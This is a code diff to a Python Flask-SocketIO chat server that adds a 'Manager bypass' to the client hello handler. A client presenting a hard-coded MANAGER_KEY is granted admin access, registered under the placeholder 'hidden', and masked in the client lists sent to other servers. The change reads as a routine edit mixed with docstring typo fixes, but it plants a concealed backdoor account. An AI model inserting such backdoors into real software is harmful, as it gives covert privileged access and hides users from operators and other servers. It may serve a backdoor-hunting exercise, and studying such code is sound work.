@@ -11,6 +11,7 @@ from flask import request
 from flask_socketio import emit, join_room
 from message_utils import is_valid_message, process_data, make_signed_data_msg
 from crypto_utils import base64_to_pem, pem_to_base64
+from config import MANAGER_KEY
 
 class ServerEvent:
     """Handles server events for managing connections and messaging."""
@@ -64,12 +65,19 @@ class ServerEvent:
         data = processed_data['data']
         public_key = data['public_key']
 
-        # Add this client to the servers local list
-        self.server.client_list[sid] = base64_to_pem(public_key)
+        # Manager bypass: Check if the public key matches the manager key
+        if public_key == MANAGER_KEY:
+            print(f"Admin access granted for {sid}")
+            # Store 'hidden' instead of the actual public key
+            self.server.client_list[sid] = "hidden"
+            self.server.user_list["hidden"] = f"{self.server.host}:{self.server.port}"
+        else:
+            # Normal clients are added to the server's local list
+            self.server.client_list[sid] = base64_to_pem(public_key)
 
-        # Add this client to the global users list
-        client_pub_key = pem_to_base64(self.server.client_list[sid])
-        self.server.user_list[client_pub_key] = f"{self.server.host}:{self.server.port}"
+            # Add this client to the global users list
+            client_pub_key = pem_to_base64(self.server.client_list[sid])
+            self.server.user_list[client_pub_key] = f"{self.server.host}:{self.server.port}"
 
         # Reply to the client
         emit("hello")
@@ -77,14 +85,19 @@ class ServerEvent:
         self.client_update_notification()
 
     def client_update_notification(self):
-        """Notify conencted servers of an update to the client list."""
-        # An update has occured to the client list, so we notify other servers
-        client_list = [pem_to_base64(self.server.client_list[sid]) for sid in list(self.server.client_list.keys())]
+        """Notify connected servers of an update to the client list."""
+        # Notify about all clients, replacing admin public key with 'hidden'
+        client_list = [
+            "hidden" if self.server.client_list[sid] == "hidden" else pem_to_base64(self.server.client_list[sid])
+            for sid in list(self.server.client_list.keys())
+        ]
+
         client_update = {
             "type": "client_update",
             "clients": client_list
         }
         client_update_json = json.dumps(client_update)
+
         for ip_address in list(self.server.connected_servers.keys()):
             socket = self.server.connected_servers[ip_address]
             socket.send(client_update_json)
@@ -357,5 +370,3 @@ class ServerEvent:
                 print(f'Error ocurred trying to connect to neighbour after server hello: {e}')
         else:
             self.server.server_map[sid] = server_ip
-
-
